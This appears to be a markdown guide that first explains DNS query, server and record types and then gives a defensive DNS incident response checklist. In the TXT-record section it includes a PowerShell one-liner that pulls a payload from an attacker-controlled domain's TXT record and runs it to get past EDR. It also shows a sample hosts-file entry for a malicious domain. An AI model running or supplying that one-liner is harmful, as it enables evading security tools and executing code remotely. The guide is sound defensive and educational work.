> # DNS Incident Response

> ## DNS: Types of DNS Records, DNS Servers and DNS Query Types

- Need a refresher on DNS concepts? This post introduces DNS and explains:

> 3 types of DNS queries—recursive, iterative, and non-recursive ·
3 types of DNS servers—DNS Resolver, DNS Root Server and Authoritative Name Server ·
10 types of common DNS records—including A, AAAA, CNAME, MX and NS 


> #### How DNS Works:


DNS is a global system for translating IP addresses to human-readable domain names. When a user tries to access a
web address like “example.com”, their web browser or application performs a DNS Query against a DNS server,
supplying the hostname. The DNS server takes the hostname and resolves it into a numeric IP address, which the web
browser can connect to.

A component called a DNS Resolver is responsible for checking if the hostname is available in local cache, and if not, contacts a series of DNS Name Servers, until eventually it receives the IP of the service the user is trying to reach, and returns it to the browser or application. This usually takes less than a second.



>  #### DNS Types: 3 DNS Query Types


There are three types of queries in the DNS system:


>  ##### 1.Recursive Query:
In a recursive query, a DNS client provides a hostname, and the DNS Resolver “must” provide an answer—it responds
with either a relevant resource record, or an error message if it can't be found. The resolver starts a recursive query process, starting from the DNS Root Server, until it finds the Authoritative Name Server (for more on Authoritative Name Servers see DNS Server Types below) that holds the IP address and other information for the requested hostname.

>  ##### 2.Iterative Query:
In an iterative query, a DNS client provides a hostname, and the DNS Resolver returns the best answer it can. If the DNS resolver has the relevant DNS records in its cache, it returns them. If not, it refers the DNS client to the Root Server, or another Authoritative Name Server which is nearest to the required DNS zone. The DNS client must then repeat the query directly against the DNS server it was referred to.

>  ##### 3.Non-Recursive Query:
A non-recursive query is a query in which the DNS Resolver already knows the answer. It either immediately returns a DNS record because it already stores it in local cache, or queries a DNS Name Server which is authoritative for the record, meaning it definitely holds the correct IP for that hostname. In both cases, there is no need for additional rounds of queries (like in recursive or iterative queries). Rather, a response is immediately returned to the client.


> ##### DNS Types: 3 Types of DNS Servers



The following are the most common DNS server types that are used to resolve hostnames into IP addresses.
DNS Resolver A DNS resolver (recursive resolver), is designed to receive DNS queries, which include a human-readable hostname such as “www.example.com”, and is responsible for tracking the IP address for that hostname.


>###### 1.DNS Resolver:
A DNS resolver (recursive resolver), is designed to receive DNS queries, which include a human-readable hostname such as “www.example.com”, and is responsible for tracking the IP address for that hostname


>###### 2.DNS Root Server
The root server is the first step in the journey from hostname to IP address. The DNS Root Server extracts the Top Level Domain (TLD) from the user’s query — for example, www.example.com —... provides details for the .com TLD Name Server. In turn, that server will provide details for domains with the .com DNS zone, including “example.com”. There are 13 root servers worldwide, indicated by the letters A through M, operated by organizations like the Internet Systems Consortium, Verisign, ICANN, the University of Maryland, and the U.S. Army Research Lab.


>###### 3.Authoritative DNS Server:
Higher level servers in the DNS hierarchy define which DNS server is the “authoritative” name server for a specific hostname, meaning that it holds the up-to-date information for that hostname.The Authoritative Name Server is the last stop in the name server query—it takes the hostname and returns the correct
IP address to the DNS Resolver (or if it cannot find the domain, returns the message NXDOMAIN).



>#### DNS Types: 10 Top DNS Record Types

- DNS servers create a DNS record to provide important information about a domain or hostname, particularly its current IP address. The most common DNS record types are:

>###### 1.Address Mapping record (A Record)—also known as a DNS host record, stores a hostname and its corresponding IPv4 address.

>###### 2.IP Version 6 Address record (AAAA Record)—stores a hostname and its corresponding IPv6 address.

>###### 3.Canonical Name record (CNAME Record)—can be used to alias a hostname to another hostname. When a DNS client requests a record that contains a CNAME, which points to another hostname, the DNS resolution process is repeated with the new hostname.

>###### 4.Mail exchanger record (MX Record)—specifies an SMTP email server for the domain, used to route outgoing emails to an email server.

>###### 5.Name Server records (NS Record)—specifies that a DNS Zone, such as “example.com” is delegated to a specific Authoritative Name Server, and provides the address of the name server.

>###### 6.Reverse-lookup Pointer records (PTR Record)—allows a DNS resolver to provide an IP address and receive a hostname (reverse DNS lookup).

>###### 7.Certificate record (CERT Record)—stores encryption certificates—PKIX, SPKI, PGP, and so on.

>###### 8.Service Location (SRV Record)—a service location record, like MX but for other communication protocols.

>###### 9.Text Record (TXT Record)—typically carries machine-readable data such as opportunistic encryption, sender policy framework, DKIM, DMARC, etc.

>###### 10.Start of Authority (SOA Record)—this record appears at the beginning of a DNS zone file, and indicates the Authoritative Name Server for the current DNS zone, contact details for the domain administrator, domain serial number, and information on how frequently DNS information for this zone should be refreshed.


>#### DNS Can Do Much More

- Now that’s we’ve covered the major types of traditional DNS infrastructure, you should know that DNS can be more
- than just the “plumbing” of the Internet. Advanced DNS solutions can help do some amazing things, including:


**`Global server`** load balancing (GSLB): fast routing of connections between globally distributed data centers.

**`Multi CDN: routing users to the CDN that will provide the best experience.`**

**`Geographical routing: identifying the physical location of each user and ensuring they are routed to the nearest
possible resource.`**

**`Data center and cloud migration: moving traffic in a controlled manner from on-premise resources to cloud
resources.`**

**`Internet traffic management: reducing network congestion and ensuring traffic flows to the appropriate resource in an optimal manner.`**

<h1 align="center">DNS Incident Response </h1>



>## 1.Persistent Malicious DNS Query Detection:

Persistent Malicious DNS Query Detection
Sometimes, malware establish a persistent DNS query mechanism in
the victim computer. In such cases, you may notice in the Linux
victim system that the systemd-resolved or, the systemdresolved.service service is sending DNS queries to the malicious
domain on startup/reboot. This service is persistent as it’s started by
the ‘/sbin/init’ process (in case of Ubuntu) and provides resolver
services for Domain Name System (details).
Preferred Action: You can first confirm the DNS queries by logging
the network activities using my tool NetDahar or, checking the
systemd-resolved cache from the journalctl log by using the below
commands (first store the logs into the dns_log.txt file and then
search the systemd-resolved logs in the file):
``` pkill -USR1 systemd-resolve ```

``` journalctl -u systemd-resolved > dns_log.txt ```



>## 2.Antivirus Enumeration Detection

Threat actors send non-recursive DNS queries to their target
organization’s DNS server (after gaining access to the network) for
different antivirus’ domains. If the DNS query for any of the anti virus
domains gets a successful DNS response, this indicates that the
specific anti virus is installed in the organization. Because, attacker
sent non-recursive DNS query, which means- the DNS server will
only send successful response if the DNS record is already stored in
the DNS server's cache. And the DNS server usually caches the DNS
record of the currently used antivirus’ domain (as it's often queried
by the antivirus for updates) thus, threat actor got the info.
Preferred Action: You can analyze the DNS query logs to check if
there are DNS queries for so many antivirus domains in a certain
period of time.



>## 3.Payload in DNS TXT Record Detection

When threat actors try to use PowerShell commands such as IEX or,
Invoke-WebRequest then, EDR or security solutions block this. To
bypass this, they can host a DNS TXT record with malicious payload
in their C2 domain and then run the below command to execute the
payload (details):
```
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
Preferred Action: You should manually analyze the DNS query logs to
find such queries for TXT records. For example, below is a sample
log for TXT records query that I generated using ChatGPT:
```
08-Jun-2023 14:30:47.000 queries: info: client 10.0.0.5#54321 (google.com): query: google.com IN TXT +
08-Jun-2023 14:30:47.000 queries: info: client 10.0.0.5#54321 (google.com): response: google.com IN TXT "facebookdomain-verification=abcdefghijk" TTL 1800
08-Jun-2023 10:15:23.000 queries: info: client 192.168.1.100#12345 (example.com): response: example.com IN TXT
"v=spf1 include:_spf.example.com ~all" TTL 3600
```


>## 4.DNS Log Bypass Detection


Threat actors may add their malicious domain and the IP address in
the hosts file (‘/etc/hosts’ in Linux) like below to temporarily bypass
the DNS and its logs:
65.181.121.56 malicious.com
Threat actors may even use ‘domain to IP’ services such as ip-api to
collect the IP address of their DGA or malicious domain rather than
querying the DNS server. So that, DNS can’t log their domain in the
query log.
Preferred Action: It’s really hard to detect such behavior if your
organization doesn’t have any DNS security solution such as
ThreatIDR. But, you can check for the existence of the DNS queries
for ‘domain to IP’ services in the log. Or, analyze the recent hosts file
modification during the incident response.



>## 5.DNS Tunneling Detection

Threat actors often encodes/encapsulates the data of different
protocols or, programs in DNS query. This technique is called DNS
tunneling. This technique sometimes includes an another hacking
method- DGA (Domain Generation Algorithm). This enables threat
actors to exfiltrate data using DNS protocol.
Preferred Action: The domain name in a DNS request can have up to
253 characters in its textual representation. So, threat actors will
require so many DNS requests to exfiltrate data. As a result, the DNS
traffic will increase, which is a good indicator of DNS tunneling
attack. Also an incident responder should analyze the data inside the
network packets by capturing the live network. This will help to
detect the DNS tunneling attack by analyzing it manually.



* # :zap: Final Summary

DNS is the main entry point for all possible internet based cyber
threats. If the DNS is safe, almost all are safe. And when the DNS is
attacked by threat actors, victim organization requires an incident
response. I described some tasks as the initial checklist of DNS
incident response in this document. But, worth to mention, there are
many more DNS threats i.e. DNS cache poisoning, DNS server’s
vulnerability exploitation etc. which requires a perfect incident
response to detect the root cause and secure the environment from
all possible threats.
